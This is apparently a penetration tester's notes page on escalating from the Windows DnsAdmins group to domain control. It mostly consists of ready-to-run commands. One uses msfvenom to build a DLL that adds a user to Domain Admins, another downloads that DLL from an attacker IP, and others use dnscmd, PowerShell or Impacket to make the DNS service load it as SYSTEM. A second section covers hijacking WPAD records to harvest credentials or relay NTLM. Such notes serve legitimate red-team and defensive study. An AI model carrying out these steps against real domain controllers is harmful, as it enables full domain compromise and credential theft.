---
created: 2026-07-22
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Privilege escalation through membership in the `DnsAdmins` group.

- [ ] Confirm membership in the `DnsAdmins` group (`net user %USERNAME% /domain` or `Get-ADGroupMember`).
- [ ] Generate a custom payload DLL (`msfvenom` or `mimilib.dll`).
- [ ] Configure `ServerLevelPluginDll` pointing to the DLL path via `dnscmd.exe` or PowerShell.
- [ ] Check service restart permissions (`sc.exe sdshow DNS`) and restart the `DNS` service.
- [ ] Verify elevated execution under `NT AUTHORITY\SYSTEM` and restore DNS configuration.
---
## `DnsAdmins`

>The **`DnsAdmins`** group is a built-in Windows domain security group that allows members to **manage DNS server configuration and zone settings** on Active Directory Domain Controllers.

- Members of the `DnsAdmins` group can manage the Microsoft DNS Server service over RPC, without requiring `Domain Admins` membership.
- The DNS service supports loading a custom server plugin DLL specified by the `ServerLevelPluginDll` registry property under `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`.
- While `DnsAdmins` members can't write directly to this registry key, RPC management interfaces allow setting `ServerLevelPluginDll` remotely using `dnscmd.exe` or PowerShell.
- When the DNS service (`dns.exe`) starts or restarts, it loads the configured DLL into its process memory and executes it as `NT AUTHORITY\SYSTEM`.

## Checking group membership

- Check whether your domain account belongs to `DnsAdmins`:

```powershell
whoami /groups
```

```powershell
net user %USERNAME% /domain
```

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

## Loading custom plugin DLLs with dnscmd.exe

- Setting `ServerLevelPluginDll` points the DNS service to an arbitrary DLL. When `dns.exe` restarts, the DLL executes in the `SYSTEM` security context.

1. Generate a custom DLL payload using `msfvenom` that executes your target command:

```bash
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" jdoe /add /domain' -f dll -o adduser.dll
```

2. Transfer the compiled DLL to a local path on the target host:

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/adduser.dll" -OutFile "C:\Users\Public\adduser.dll"
```

3. Configure the `ServerLevelPluginDll` registry property using `dnscmd.exe`:

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\Public\adduser.dll
```

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `/config` | — | Specifies DNS server configuration modification. |
| `/serverlevelplugindll` | `C:\Users\Public\adduser.dll` | Path to the custom plugin DLL on the target system. |

- Alternatively, set the property using PowerShell:

```powershell
Set-DnsServerServerLevelPluginDll -ServerName dc01.example.com -DllPath C:\Users\Public\adduser.dll
```

- Alternatively, configure the DLL path remotely from Linux using Impacket `dnscmd.py`:

```bash
dnscmd.py example.com/jdoe:'passwd123'@10.10.11.5 -serverlevelplugindll C:\Users\Public\adduser.dll
```

4. Check restart permissions on the DNS service:

```cmd
wmic useraccount where "name='jdoe'" get sid
```

```powershell
sc.exe sdshow DNS
```

> [!note] In the output SDDL string, look for `(A;;RPWP;;;<your_SID>)` or `(A;;RPWP;;;<DnsAdmins_SID>)`. `RP` corresponds to `SERVICE_START` and `WP` corresponds to `SERVICE_STOP`.

5. Restart the DNS service to trigger DLL execution:

```powershell
sc.exe stop dns
```

```powershell
sc.exe start dns
```

6. Verify elevated group membership:

```powershell
net group "Domain Admins" /domain
```

>[!tip]+
> - Restore the DNS server registry property to avoid service initialization errors on subsequent restarts:
>
> ```powershell
> reg delete \\10.10.11.5\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
> sc.exe stop dns
> sc.exe start dns
> ```
> - Remove the dropped DLL payload:
>
> ```powershell
> Remove-Item -Path "C:\Users\Public\adduser.dll" -Force
> ```

## Hijacking WPAD records

- `DnsAdmins` members can disable the DNS global query block list to register WPAD (Web Proxy Auto-Discovery) records for credential harvesting or NTLM relay attacks.

1. Disable the global query block list on the Domain Controller:

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.example.com
```

2. Add a `WPAD` resource record pointing to your listener IP address:

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName example.com -ComputerName dc01.example.com -IPv4Address <attacker_ip_address>
```

- Alternatively, manage records remotely from Linux using `dnstool.py`:

```bash
python3 dnstool.py -u 'example.com\jdoe' -p 'passwd123' -a add -r wpad -d <attacker_ip_address> 10.10.11.5
```

## References and further reading

- [`MS-DNSP: ServerLevelPluginDll — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723)
- [`dnscmd — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
- [`Feature, not bug: DNSAdmin to DC compromise in one line — Shay Ber`](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
- [`From DNSAdmins to Domain Admin — ADSecurity`](https://adsecurity.org/?p=4064)
- [`Abusing DNSAdmins privilege for escalation in Active Directory — Lab of a Penetration Tester`](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)